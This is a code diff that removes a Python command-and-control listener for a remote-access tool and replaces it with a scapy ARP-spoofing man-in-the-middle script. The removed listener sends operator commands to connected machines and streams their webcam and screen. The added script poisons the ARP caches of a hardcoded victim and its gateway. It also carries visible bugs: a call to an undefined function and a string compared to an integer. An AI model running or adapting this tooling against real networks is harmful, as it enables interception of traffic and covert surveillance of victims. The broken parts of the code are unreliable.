@@ -1,98 +1,87 @@
-import socket
-import threading
+from scapy.all import Ether, ARP, srp, send
+import argparse
 import time
-from flask import Flask, Response, render_template_string
-from colorama import Fore, Style, init
-import cv2
-import numpy as np
-import signal
+import os
 import sys
 
-init(autoreset=True)
+def _enable_linux_iproute():
+    """
+    Enables IP route ( IP Forward ) in linux-based distro
+    """
+    file_path = "/proc/sys/net/ipv4/ip_forward"
+    with open(file_path) as f:
+        if f.read() == 1:
+            # already enabled
+            return
+    with open(file_path, "w") as f:
+        print(1, file=f)
 
-app = Flask(__name__)
-server_thread = None
-stop_server_flag = threading.Event()
+def get_mac(ip):
+    """
+    Returns MAC address of any device connected to the network
+    If ip is down, returns None instead
+    """
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
 
-html_template = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>{{title}}</title>
-</head>
-<body>
-    <h1>{{title}}</h1>
-    <img src="{{url}}" width="640" height="480">
-</body>
-</html>
-"""
 
-def start_streaming(client_socket, mode):
-    print(Fore.BLUE + "[ * ] Starting...")
-    time.sleep(1)
-    print(Fore.BLUE + "[ * ] Preparing player...")
-    time.sleep(1)
+def spoof(target_ip, host_ip, verbose=True):
+    """
+    Spoofs `target_ip` saying that we are `host_ip`.
+    it is accomplished by changing the ARP cache of the target (poisoning)
+    """
+    # get the mac address of the target
+    target_mac = get_mac(target_ip)
+    # craft the arp 'is-at' operation packet, in other words; an ARP response
+    # we don't specify 'hwsrc' (source MAC address)
+    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+    # send the packet
+    # verbose = 0 means that we send the packet without printing any thing
+    send(arp_response, verbose=0)
+    if verbose:
+        # get the MAC address of the default interface we are using
+        self_mac = ARP().hwsrc
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
-    @app.route('/video_feed')
-    def video_feed():
-        return Response(generate_frames(client_socket),
-                        mimetype='multipart/x-mixed-replace; boundary=frame')
-
-    @app.route('/')
-    def index():
-        return render_template_string(html_template, title=mode + " Stream", url='/video_feed')
-
-    def run_server():
-        app.run(host='0.0.0.0', port=5000, use_reloader=False)
-
-    global server_thread
-    server_thread = threading.Thread(target=run_server)
-    server_thread.start()
-
-    print(Fore.BLUE + f"Opening player at: http://localhost:5000")
-    print(Fore.BLUE + "[ * ] Streaming...")
-
-def generate_frames(client_socket):
-    while True:
-        data = client_socket.recv(921600)
-        if not data:
-            break
-        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
-        ret, buffer = cv2.imencode('.jpg', frame)
-        frame = buffer.tobytes()
-        yield (b'--frame\r\n'
-               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-
-def handle_client(client_socket):
-    while True:
-        command = input(Fore.MAGENTA + "medusa > ")
-        if command == "CTRL+P":
-            stop_server()
-            print(Fore.RED + "[ * ] Server stopped.")
-            continue
-        client_socket.send(command.encode('utf-8'))
-        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
-            mode = command.split('_')[0]
-            start_streaming(client_socket, mode)
-
-def stop_server():
-    stop_server_flag.set()
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        raise RuntimeError('Not running with the Werkzeug Server')
-    func()
-
-def main():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', 9999))
-    server_socket.listen(5)
-    print(Fore.GREEN + "[ * ] Listening for incoming connections...")
-
-    while True:
-        client_socket, addr = server_socket.accept()
-        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-        client_handler.start()
+def restore(target_ip, host_ip, verbose=True):
+    """
+    Restores the normal process of a regular network
+    This is done by sending the original informations 
+    (real IP and MAC of `host_ip` ) to `target_ip`
+    """
+    # get the real MAC address of target
+    target_mac = get_mac(target_ip)
+    # get the real MAC address of spoofed (gateway, i.e router)
+    host_mac = get_mac(host_ip)
+    # crafting the restoring packet
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
+    # sending the restoring packet
+    # to restore the network to its normal process
+    # we send each reply seven times for a good measure (count=7)
+    send(arp_response, verbose=0, count=7)
+    if verbose:
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
 if __name__ == "__main__":
-    main()
+    # victim ip address
+    target = "10.0.1.40"
+    # gateway ip address
+    host = "10.0.1.138"
+    # print progress to the screen
+    verbose = True
+    # enable ip forwarding
+    enable_ip_route()
+    try:
+        while True:
+            # telling the `target` that we are the `host`
+            spoof(target, host, verbose)
+            # telling the `host` that we are the `target`
+            spoof(host, target, verbose)
+            # sleep for one second
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[!] Detected CTRL+C ! restoring the network, please wait...")
+        restore(target, host)
+        restore(host, target)
